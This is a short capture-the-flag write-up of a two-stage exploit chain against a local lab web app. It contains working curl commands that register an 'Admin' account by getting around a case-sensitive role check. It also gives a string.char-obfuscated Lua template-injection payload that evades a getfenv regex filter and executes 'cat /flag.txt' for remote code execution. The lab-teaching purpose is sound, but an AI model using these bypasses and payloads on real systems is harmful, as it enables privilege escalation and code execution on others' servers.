# Writeup

## Exploit Chain

**Stage 1**: Role bypass via case sensitivity  
**Stage 2**: Regex bypass + RCE via `getfenv(0+2)`

## Stage 1: Privilege Escalation

### Vulnerability

Registration blocks `role: "admin"` but allows `"Admin"`.

### Exploit

```bash
curl -c cookies.txt -X POST http://localhost:61000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"password123","role":"Admin"}'

curl -c cookies.txt -b cookies.txt -X POST http://localhost:61000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"password123"}'
```

## Stage 2: Regex Bypass + Environment Read

### Vulnerability

Regex blocks `getfenv(N)` where N ≠ 0, but `getfenv(0+2)` bypasses it.

### RCE Chain

```lua
getfenv(0+2)
  ["require"]("@lune/process")
  .exec("cat", {"/flag.txt"}).stdout
```

### Full Payload

```bash
# ASCII codes:
# require = 114,101,113,117,105,114,101
# @lune/process = 64,108,117,110,101,47,112,114,111,99,101,115,115
# cat = 99,97,116
# /flag.txt = 47,102,108,97,103,46,116,120,116

curl -s -b cookies.txt http://localhost:61000/admin/template -X POST \
  -H "Content-Type: application/json" \
  -d '{"template": "{{getfenv(0+2)[string.char(114,101,113,117,105,114,101)](string.char(64,108,117,110,101,47,112,114,111,99,101,115,115)).exec(string.char(99,97,116), {string.char(47,102,108,97,103,46,116,120,116)}).stdout}}", "data": {}}'
```
